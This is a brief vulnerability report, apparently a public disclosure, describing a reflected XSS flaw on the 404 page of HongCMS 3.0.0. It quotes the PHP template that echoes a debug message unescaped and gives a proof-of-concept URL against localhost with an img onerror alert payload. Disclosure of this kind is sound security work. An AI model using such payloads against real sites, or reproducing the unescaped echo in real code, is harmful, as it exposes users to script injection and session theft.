There is a reflective XSS on the 404 page of the web site

# Powered by Shiyan 

Vulnerability analysis：

In the 404 error page, the wrong code was used, resulting in the existence of XSS vulnerability.

Loophole code：

'''
</style>
</head>
<body>
	<div id="container">
		<h1>404 Page Not Found</h1>
		<p><?php echo $debugmsg; ?></p>
		<p>您尝试访问的页面未找到!</p>
	</div>
</body>
</html>
'''

Reflected XSS PoC:

http://127.0.0.1/hongcms_3.0.0_free/index.php/abou<img src=x onerror=alert('shiyan')>

Vulnerability trigger screenshot：



Note: the vulnerability will be exploited by malicious users.
